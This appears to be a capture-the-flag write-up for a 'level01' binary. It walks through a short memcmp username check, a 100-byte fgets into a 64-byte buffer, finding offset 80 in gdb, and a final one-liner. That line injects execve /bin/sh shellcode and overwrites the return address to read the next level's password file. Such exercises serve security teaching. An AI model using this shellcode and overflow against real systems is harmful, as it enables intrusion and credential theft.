# Level01

## shellcode injection

```c
char a_user_name[100];


int verify_user_name()
{
    puts("verifying username....\n");
    return memcmp(a_user_name, "dat_wil", 7) != 0;
}
```

We can see that the username check is made with 7 in memcmp limit.
So we can put what we want after dat_wil.

```shell
$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wilabdcef
verifying username....

Enter Password: 
pass
nope, incorrect password...
```

## buffer overflow

```c
    char password[64];
    ...
        puts("Enter Password: ");
        fgets(password, 100, stdin);
```

There is a fgets of 100 chars in a buffer of 64.
We can check the buffer overflow offset with a buffer overflow mask.

```shell
$ gdb ./level01
(gdb) r
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

The register value gives us an offset of 80.

## Find the shellcode address

The shellcode will be in the username string, just after "dat_wil".
Therefore we can add 7 to the `a_user_name`'s address.

We can get the address of `a_user_name` with objdump.

```shell
$ objdump -t ./level01 | grep a_user_name
0804a040 g     O .bss	00000064              a_user_name
```

```
shellcode addr:
    0x0804a040 + 0x7 = 0x0804a047
```

## Exploit

We can write an exploit with in first input "dat_wil" + shellcode and in second 80 * "a" + \x47\xa0\x04\x08.

```shell
(echo -e "dat_wil\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"; python -c  'print "a" * 80 + "\x47\xa0\x04\x08"'; echo "cat /home/users/level02/.pass") | ./level01
```
